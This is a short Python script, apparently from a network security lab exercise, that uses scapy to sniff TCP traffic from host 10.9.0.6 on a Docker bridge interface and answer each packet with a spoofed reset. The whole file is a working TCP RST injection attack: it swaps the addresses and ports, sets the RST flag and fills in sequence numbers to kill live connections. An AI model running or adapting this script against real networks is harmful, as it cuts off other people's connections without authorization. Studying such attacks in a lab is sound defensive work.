#!/usr/bin/env python3
from fcntl import FASYNC
from time import sleep
from scapy.all import *

def spoof_pkt(pkt):
    new_pkt = IP()/TCP()

    new_pkt[IP].src = pkt[IP].dst
    new_pkt[IP].dst = pkt[IP].src

    new_pkt[TCP].sport = pkt[TCP].dport
    new_pkt[TCP].dport = pkt[TCP].sport

    new_pkt[TCP].flags |= "R"

    new_pkt[TCP].ack = pkt[TCP].seq+1
    new_pkt[TCP].seq = pkt[TCP].ack+1

    send(new_pkt, verbose=0)


if __name__ == '__main__':

    pkt = sniff(iface='br-8bdd88cc20ec', filter='tcp and ip src 10.9.0.6 and not ether src 02:42:bb:0f:b4:88', prn=spoof_pkt)
